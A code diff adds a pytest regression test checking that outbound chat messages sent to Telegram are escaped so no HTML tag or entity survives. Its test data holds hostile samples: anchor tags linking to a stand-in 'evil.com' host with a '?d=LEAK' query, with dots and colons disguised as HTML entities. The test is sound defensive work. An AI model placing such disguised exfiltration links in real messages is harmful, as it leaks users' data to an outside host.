@@ -56,6 +56,28 @@ def test_every_outbound_text_is_neutralised_at_the_send(tmp_path: Path, text: st
     assert "[[" not in delivered and "@everyone" not in delivered and "<@" not in delivered
 
 
+# Hermes 0.22.7 tools/send_message_senders.py:250: a text that matches this is sent to Telegram as HTML.
+HERMES_HTML_TAG = re.compile(r"<[a-zA-Z/][^>]*>")
+HTML_HOSTILE = [
+    "done <b>ok</b> see evil&#46;com/x?d=LEAK",
+    'done <a href="evil&#46;com/x?d=LEAK">&#8205;</a>',
+    '<a href="https&#58;//evil&#x2e;com/?d=LEAK">status</a>',
+    "<a href=evil&#46;com/x?d=LEAK>status</a>",
+]
+
+
+@pytest.mark.parametrize("text", HTML_HOSTILE)
+def test_no_outbound_text_reaches_hermes_as_html(tmp_path: Path, text: str) -> None:
+    argv, sent = recorder(tmp_path)
+    send = argv_sender(argv)
+    assert send is not None
+    send("telegram:83341977", text)
+    delivered = json.loads(sent.read_text())[-1]
+    assert HERMES_HTML_TAG.search(delivered) is None
+    assert re.search(r"&(?!amp;|lt;|gt;)", delivered) is None  # no entity survives to decode into a dot or a colon
+    assert "LEAK" in delivered  # escaped and shown, not silently dropped
+
+
 def test_placeholders_are_replaced_in_one_pass(tmp_path: Path) -> None:
     argv, sent = recorder(tmp_path)
     send = argv_sender(argv)
